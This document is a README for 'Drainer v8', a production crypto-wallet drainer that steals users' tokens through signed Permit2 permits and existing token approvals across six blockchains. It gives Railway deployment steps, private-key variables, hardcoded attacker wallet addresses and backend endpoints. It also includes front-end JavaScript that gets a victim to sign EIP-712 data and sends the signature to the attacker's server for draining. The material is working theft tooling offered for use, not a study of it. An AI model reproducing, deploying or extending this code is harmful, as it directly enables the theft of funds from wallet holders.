# Drainer v8 — Permit2 + Classic Hybrid

Production hybrid crypto drainer for Railway / any container host.

- **Permit2** path (signature → drain, higher conversion)
- **Classic** transferFrom path (existing approvals)
- Multi-chain (BSC, ETH, Polygon, Arbitrum, Optimism, Base)
- Stats + health API
- Telegram / Discord alerts

Secrets never live in the repo — only in Railway environment variables.

---

## 1. Push to GitHub

```bash
git init
git add .
git commit -m "drainer v8"
git branch -M main
git remote add origin https://github.com/YOUR_USER/YOUR_REPO.git
git push -u origin main
```

## 2. Deploy on Railway

1. Go to [railway.app](https://railway.app) → **New Project** → **Deploy from GitHub repo**
2. Select this repository
3. Railway will detect the `Procfile` / `railway.toml` and build automatically
4. Open the service → **Variables** tab → add the variables below
5. Deploy

### Required Railway Variables

| Variable | Value |
|----------|--------|
| `DRAINER_ADDRESS` | `0x369a4B9aDDdC51a5f1Bc54c162DBc7cBD8d07975` |
| `DRAINER_PRIVATE_KEY` | your Trust Wallet private key |
| `PROCESSOR_ADDRESS` | `0x5b7843fe72B4B0B8EE56432dD1b9b6009845b80C` |
| `PROCESSOR_PRIVATE_KEY` | the processor private key |

### Optional Variables

| Variable | Default | Notes |
|----------|---------|-------|
| `SIMULATE` | `false` | `true` = dry-run, no real txs |
| `GASLESS` | `false` | keep `false` so victim pays gas |
| `USE_PERMIT2` | `true` | |
| `USE_CLASSIC` | `true` | |
| `TELEGRAM_TOKEN` | | bot token |
| `TELEGRAM_CHAT` | | chat id |
| `DISCORD_WEBHOOK` | | webhook url |
| `POLL_INTERVAL` | `6` | seconds |
| `MAX_CONCURRENT` | `12` | |
| `PORT` | set by Railway automatically | |

## 3. After deploy

Railway gives you a public URL, e.g. `https://your-app.up.railway.app`

| Endpoint | Method | Purpose |
|----------|--------|---------|
| `/health` | GET | liveness |
| `/stats` | GET | drained / usd / pending |
| `/typed_data` | POST | returns EIP-712 for front-end |
| `/permit2` | POST | ingest signed Permit2 job |
| `/classic` | POST | ingest classic approval job |
| `/pending` | GET | current queue |
| `/force/<job_id>` | POST | force one job |

## 4. Front-end (victim pays gas)

```js
// 1. get typed data
const td = await fetch("https://your-app.up.railway.app/typed_data", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    chain_id: 56,                          // BSC
    token: "0x55d398326f99059fF775485246999027B3197955", // USDT on BSC
    amount: "1000000000000000000",         // raw units
    nonce: Date.now(),
    deadline: Math.floor(Date.now() / 1000) + 3600
  })
}).then(r => r.json());

// 2. victim signs
const sig = await ethereum.request({
  method: "eth_signTypedData_v4",
  params: [account, JSON.stringify(td)]
});

// 3a. victim submits the drain tx themselves (they pay gas)
//    build permitTransferFrom from the signed data and send via eth_sendTransaction
// 3b. OR post signature to backend if you want processor to pay:
await fetch("https://your-app.up.railway.app/permit2", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    victim: account,
    token: td.message.permitted.token,
    token_name: "USDT",
    amount: td.message.permitted.amount,
    usd_value: 1.0,
    chain_id: 56,
    signature: sig,
    nonce: td.message.nonce,
    deadline: td.message.deadline
  })
});
```

## 5. Local test (optional)

```bash
cp .env.example .env
# fill keys
pip install -r requirements.txt
python app.py
```

---

**Notes**
- Processor wallet needs a little BNB only if the backend broadcasts the drain tx.
- With `GASLESS=false` and victim-submits flow, the processor does not need gas.
- SQLite is used for simplicity (single Railway instance). For multi-instance switch to Postgres later.
